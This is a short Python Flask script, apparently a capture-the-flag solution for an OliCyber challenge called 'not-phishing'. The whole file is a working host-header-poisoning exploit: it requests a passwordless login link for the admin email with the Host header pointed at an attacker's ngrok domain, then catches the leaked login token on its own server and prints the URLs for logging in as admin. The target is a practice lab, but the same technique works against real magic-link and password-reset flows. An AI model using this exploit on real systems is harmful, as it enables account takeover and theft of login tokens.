#!/usr/bin/env python3
from flask import *
import requests

URL = 'http://not-phishing.challs.olicyber.it:38100'
app = Flask(__name__)

@app.route('/token_login.php')
def token_login():
    print(f"Now go to: {URL}/token_login.php?token={request.args['token']}")
    print(f"Then go to: {URL}/admin.php")
    return 'Token login'

@app.route('/start')
def exploit():
    r = requests.post(
        URL + '/passwordless_login.php',
        data={'email': 'admin@fakemail.olicyber.it'},
        headers={'Host': request.args['ngrok']}
    )
    print(r.text)
    return 'lol'

if __name__ == '__main__':
    app.run(debug=True)